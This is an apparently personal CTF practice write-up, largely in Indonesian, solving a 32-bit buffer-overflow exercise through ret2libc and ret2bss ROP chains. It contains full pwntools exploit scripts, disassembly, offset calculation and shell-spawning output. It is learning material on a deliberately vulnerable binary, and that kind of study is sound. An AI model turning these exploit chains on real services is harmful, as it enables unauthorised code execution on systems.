---
slug: "pwn-daily-32"
title: "daily_32"
competition: "Exercise"
category: "Pwn"
difficulty: "Medium"
date: "2026-08-18"
updated: "2026-08-24"
summary: "Latihan buat persiapan seleksi LKS, isinya ret2bss / ret2plt."
tags: ["PWN","ROP","HANDS-ON","MEDIUM","X86","RET2BSS"]
status: "published"
flag: "SHELL"
attachments: []
source: "https://claritys.web.id/writeups/pwn-daily-32"
---

# daily_32

> Latihan buat persiapan seleksi LKS, isinya ret2bss / ret2plt.

Di sini kita tidak diberi hint apa apa, jadi kita harus ngerecon.

Langsung saja kita checksec.

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/daily main*
❯ checksec daily_32                                                              󰥔 14:02:02
[*] '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/daily/daily_32'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Let’s check the function.

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/daily main*
❯ pwndbg daily_32                                                                                                                                                                󰥔 14:01:02
info fun
GEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB 16.3 in 0.00ms using Python engine 3.13
pwndbg: loaded 212 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
Reading symbols from daily_32...

This GDB supports auto-downloading debuginfo from the following URLs:
  <https://debuginfod.cachyos.org>
  <https://debuginfod.archlinux.org>
Debuginfod has been disabled.
To make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.
(No debugging symbols found in daily_32)
gef➤  info fun
All defined functions:

Non-debugging symbols:
0x08049000  _init
0x080490a0  printf@plt
0x080490b0  gets@plt
0x080490c0  puts@plt
0x080490d0  system@plt
0x080490e0  __libc_start_main@plt
0x080490f0  setvbuf@plt
0x08049100  _start
0x08049140  _dl_relocate_static_pie
0x08049150  __x86.get_pc_thunk.bx
0x08049160  deregister_tm_clones
0x080491a0  register_tm_clones
0x080491e0  __do_global_dtors_aux
0x08049210  frame_dummy
0x08049216  init
0x08049260  time
0x0804928f  daily
0x08049314  main
0x08049339  __x86.get_pc_thunk.ax
0x08049340  __libc_csu_init
0x080493b0  __libc_csu_fini
0x080493b5  __x86.get_pc_thunk.bp
0x080493bc  _fini
```

There’s so many symbols and function in this one, lets check the function.

```
gef➤  disas main
Dump of assembler code for function main:
   0x08049314 <+0>:     endbr32
   0x08049318 <+4>:     push   ebp
   0x08049319 <+5>:     mov    ebp,esp
   0x0804931b <+7>:     and    esp,0xfffffff0
   0x0804931e <+10>:    call   0x8049339 <__x86.get_pc_thunk.ax>
   0x08049323 <+15>:    add    eax,0x2cdd
   0x08049328 <+20>:    call   0x8049216 <init>
   0x0804932d <+25>:    call   0x804928f <daily>
   0x08049332 <+30>:    mov    eax,0x0
   0x08049337 <+35>:    leave
   0x08049338 <+36>:    ret
End of assembler dump.
gef➤  disas time
Dump of assembler code for function time:
   0x08049260 <+0>:     endbr32
   0x08049264 <+4>:     push   ebp
   0x08049265 <+5>:     mov    ebp,esp
   0x08049267 <+7>:     push   ebx
   0x08049268 <+8>:     sub    esp,0x4
   0x0804926b <+11>:    call   0x8049339 <__x86.get_pc_thunk.ax>
   0x08049270 <+16>:    add    eax,0x2d90
   0x08049275 <+21>:    sub    esp,0xc
   0x08049278 <+24>:    lea    edx,[eax-0x1ff8]
   0x0804927e <+30>:    push   edx
   0x0804927f <+31>:    mov    ebx,eax
   0x08049281 <+33>:    call   0x80490d0 <system@plt>
   0x08049286 <+38>:    add    esp,0x10
   0x08049289 <+41>:    nop
   0x0804928a <+42>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x0804928d <+45>:    leave
   0x0804928e <+46>:    ret
End of assembler dump.
gef➤  disas daily
Dump of assembler code for function daily:
   0x0804928f <+0>:     endbr32
   0x08049293 <+4>:     push   ebp
   0x08049294 <+5>:     mov    ebp,esp
   0x08049296 <+7>:     push   ebx
   0x08049297 <+8>:     sub    esp,0x34
   0x0804929a <+11>:    call   0x8049150 <__x86.get_pc_thunk.bx>
   0x0804929f <+16>:    add    ebx,0x2d61
   0x080492a5 <+22>:    sub    esp,0xc
   0x080492a8 <+25>:    lea    eax,[ebx-0x1ff0]
   0x080492ae <+31>:    push   eax
   0x080492af <+32>:    call   0x80490c0 <puts@plt>
   0x080492b4 <+37>:    add    esp,0x10
   0x080492b7 <+40>:    sub    esp,0xc
   0x080492ba <+43>:    lea    eax,[ebx-0x1fd0]
   0x080492c0 <+49>:    push   eax
   0x080492c1 <+50>:    call   0x80490c0 <puts@plt>
   0x080492c6 <+55>:    add    esp,0x10
   0x080492c9 <+58>:    sub    esp,0xc
   0x080492cc <+61>:    lea    eax,[ebx-0x1fbc]
   0x080492d2 <+67>:    push   eax
   0x080492d3 <+68>:    call   0x80490c0 <puts@plt>
   0x080492d8 <+73>:    add    esp,0x10
   0x080492db <+76>:    sub    esp,0xc
   0x080492de <+79>:    lea    eax,[ebx-0x1f6c]
   0x080492e4 <+85>:    push   eax
   0x080492e5 <+86>:    call   0x80490a0 <printf@plt>
   0x080492ea <+91>:    add    esp,0x10
   0x080492ed <+94>:    sub    esp,0xc
   0x080492f0 <+97>:    lea    eax,[ebp-0x30]
   0x080492f3 <+100>:   push   eax
   0x080492f4 <+101>:   call   0x80490b0 <gets@plt>
   0x080492f9 <+106>:   add    esp,0x10
   0x080492fc <+109>:   sub    esp,0xc
   0x080492ff <+112>:   lea    eax,[ebx-0x1f14]
   0x08049305 <+118>:   push   eax
   0x08049306 <+119>:   call   0x80490c0 <puts@plt>
   0x0804930b <+124>:   add    esp,0x10
   0x0804930e <+127>:   nop
   0x0804930f <+128>:   mov    ebx,DWORD PTR [ebp-0x4]
   0x08049312 <+131>:   leave
   0x08049313 <+132>:   ret
End of assembler dump.
```

Okay then, now we count the padding for the gets. 0x30 = 48, because its x86, we need 52 for reaching EIP. And now we verification for the offset for the EIP.

```
>>> 0x30
48
>>> 0x30 + 4
52
```

```
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x1f
$ebx   : 0x6161616c ("laaa"?)
$ecx   : 0xf7f7b888  →  0x00000000
$edx   : 0xf7f7b888  →  0x00000000
$esp   : 0xffffd1d0  →  "oaaapaaaqaaara"
$ebp   : 0x6161616d ("maaa"?)
$esi   : 0xf7f79e2c  →  0x00292d4c ("L-)"?)
$edi   : 0x08049340  →  <__libc_csu_init+0000> endbr32
$eip   : 0x6161616e ("naaa"?)
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
──────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd1d0│+0x0000: "oaaapaaaqaaara"     ← $esp
0xffffd1d4│+0x0004: "paaaqaaara"
0xffffd1d8│+0x0008: "qaaara"
0xffffd1dc│+0x000c: 0xf7006172 ("ra"?)
0xffffd1e0│+0x0010: 0x00000001
0xffffd1e4│+0x0014: 0xffffd2a4  →  0xffffd4a7  →  "/home/claritys/ctf/pwncheatsheet/learnfromLKS/Bina[...]"
0xffffd1e8│+0x0018: 0xffffd2ac  →  0xffffd50c  →  "PATH=/home/claritys/.local/bin:/opt/cuda/bin:/home[...]"
0xffffd1ec│+0x001c: 0x00000000
────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x6161616e
────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "daily_32", stopped 0x6161616e in ?? (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────── trace ────
───────────────────────────────────────────────────────────────────────────────────────────
gef➤  cyclic -l naaa
Finding cyclic pattern of 4 bytes: b'naaa' (hex: 0x6e616161)
Found at offset 52
```

Nah, di sini karena cara termudah yaitu ret2libc, jadinya aku cari function yang diperlukan.

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/daily main*
❯ ldd daily_32                                                                   󰥔 14:08:14
        linux-gate.so.1 (0xf7fb8000)
        libc.so.6 => /usr/lib32/libc.so.6 (0xf7ce7000)
        /lib/ld-linux.so.2 => /usr/lib/ld-linux.so.2 (0xf7fbb000)

~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/daily main*
❯ readelf -s /usr/lib32/libc.so.6 | grep system                                  󰥔 14:08:34
  1164: 000613c0    63 FUNC    WEAK   DEFAULT   10 system@@GLIBC_2.0

~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/daily main*
❯ strings -a -t x /usr/lib32/libc.so.6 | grep /bin/sh                            󰥔 14:09:17
 232500 /bin/sh
 234f41 /bin/sh
```

My own solver: (actually I’m using template from pwninit and then i modifed it a bit for my own environment)

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("daily_32_patched")

exe = context.binary
context.terminal = ["ghostty", "-e"]

gdbscript = """
set pagination off
set confirm off

break main
continue
"""

def conn():
    if args.GDB:
        r = process([elf.path])
        gdb.attach(r, gdbscript=gdbscript)
        return r

    if args.LOCAL:
        return process([elf.path])

    return remote("addr", 1337)

def main():
    r = conn()
    padding = 52
    libc = 0xf7ce7000
    systemlibc = libc + 0x000613c0
    binsh = libc + 0x232500
    payload = flat(
        b'A' * 52,
        systemlibc,
        0,
        binsh
    )
    # good luck pwning :)
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    main()
```

**Implement:**

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/daily main*
❯ python3 solve.py LOCAL                                                         󰥔 14:10:16
[*] '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/daily/daily_32_patched'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[x] Starting local process '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Ha[▁] Starting local process '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Ha[+] on/ROP/ret2combine/daily/daily_32_patched': pid 104428
[*] Switching to interactive mode
--- [ Lylera's Diary Book ] ---
Lylera: Halooo!
Lylera: Aku punya banyak kesibukan. Tapi untuk hari ini aku mau nulis sesuatu.
Lylera: Simple aja sih... Mungkin bisa something yang aku inginkan. Oh aku ada ide!
> Lylera: puurrrfeectt!! Thx yow
$ ls
daily_32  daily_32_patched  daily_64  daily.c  daily.zip  solve.py
$
```

Solver resmi dari latihan LKS nya adalah:

```bash
~/c/p/l/B/H/R/r/daily main* 1h 10m 36s
❯ cat ../daily_32.py                                                             󰥔 15:20:53
# Baru bisa main auto pwntools yowww

from pwn import *

elf = context.binary = ELF('./daily_32')
p = process()

# lets see apa aja yang ditemukan
offset = 52

# Karena ini 32 bit and boleh auto, jadi langsung saja

bss = elf.bss()
system = elf.plt['system']
gets_plt = elf.plt['gets']

ret = p32(0x080493a3) #0x080493a3 : pop ebp ; ret

payload = flat(
    b'A' * offset,

    gets_plt,
    ret,
    bss,

    system,
    p32(0x0),
    bss
)

p.sendline(payload)
p.sendline(b'/bin/sh\x00')
p.interactive()⏎
```

Nah ketika aku melihat solver dari LKS ini, aku langsung sadar kalau aku ngesolvenya unintended hehe. Jadinya aku mencoba ngesolve ulang.

**Kenapa Harus Ada Return Address Dummy (**`p32(0x0)`**) untuk** `system`**?**  
Dalam aturan pemanggilan fungsi 32-bit (_cdecl_), ketika sebuah fungsi baru (seperti `system`) mulai mengeksekusi instruksinya, fungsi tersebut **selalu membaca stack dengan tata letak baku**:  
• `[ESP]` Dianggap sebagai **Return Address** (Ke mana CPU harus melompat kalau fungsi ini selesai).  
• `[ESP + 4]` Dianggap sebagai **Argumen 1** (Data yang akan diproses oleh fungsi).

Dia menerapkan `ret2bss`. Setelah aku memahami dengan waktu yang lama solver resminya, ternyata aku kurang difundamentalnya.

Jadi, alasan dia memilih gets diawal itu karena agar bisa ngewrite apa yang kita mau ke tempat yang kita mau. Di sini, kita memilih `bss` karena dia ini writeable dan readable. Jadinya nanti `system()` bisa ngebaca dia, karena dia ini alamatnya tidak berubah jika `PIE` nya tidak aktif. Nah, alasan kenapa `ret` nya itu ada `pop ebp; ret`, itu agar stacknya itu menuju ke `system(),` bukan `bss`. Sebenarnya bebas boleh memilih `pop ebp` atau yang lain seperti `edx`, dll, pokoknya jangan `pop esp` karena nanti sia sia.

### Trik Alternatif: Gadget `add esp`

Selain menggunakan `pop`, para _pwner_ juga sering menggunakan gadget `add esp`:

-   `add esp, 0x4 ; ret` → Sama persis dengan 1x `pop ; ret` (membuang 4 byte).
    

-   `add esp, 0x8 ; ret` → Sama persis dengan 2x `pop ; ret` (membuang 8 byte).
    

Gadget `add esp` langsung menggeser jarum `ESP` tanpa harus menyentuh register data sama sekali.

Setelah `system()` tereksekusi, kita membutuhkan dummy 0x0 biar nanti argumen 1 nya itu bisa di isi dengan bss (argumen 1 bakal diproses sama fungsi). Nah, setelah payloadnya pada tereksekusi, kita tinggal input untuk memenuhi gets terus nanti inputnya bakal masuk ke bss yang nantinya bakal dieksekusi sama `system()`

My solver with intended solve:

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("daily_32_patched")
libc = elf.libc

exe = context.binary
context.terminal = ["ghostty", "-e"]
context.arch = 'i386'
gdbscript = """
set pagination off
set confirm off

break main
continue
"""

def conn():
    if args.GDB:
        r = process([elf.path])
        gdb.attach(r, gdbscript=gdbscript)
        return r

    if args.LOCAL:
        return process([elf.path])

    return remote("addr", 1337)

def main():
    r = conn()
    padding = 52
    bss = elf.bss()
    gets = elf.sym['gets']
    system = elf.sym['system']
    payload = flat(
        b'A' * 52,
        gets,
        0x08049022, #pop ebx; ret
        bss,
        system,
        0x0,
        bss
    )
    r.sendlineafter(b'> ', payload)
    r.sendline(b'/bin/sh\x00')
    # good luck pwning :)
    r.interactive()

if __name__ == "__main__":
    main()
```

Implement:

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/daily main* 56s
❯ python3 solve.py LOCAL                                                         󰥔 13:58:50
[*] '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/daily/daily_32_patched'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[*] '/usr/lib32/libc.so.6'
    Arch:       i386-32-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
[x] Starting local process '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Ha[.] Starting local process '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Ha[+] on/ROP/ret2combine/daily/daily_32_patched': pid 74368
[*] Switching to interactive mode
Lylera: puurrrfeectt!! Thx yow
$ ls
daily_32          daily_64  daily.zip                   solve.py
daily_32_patched  daily.c   solve32_unintended_libc.py
```
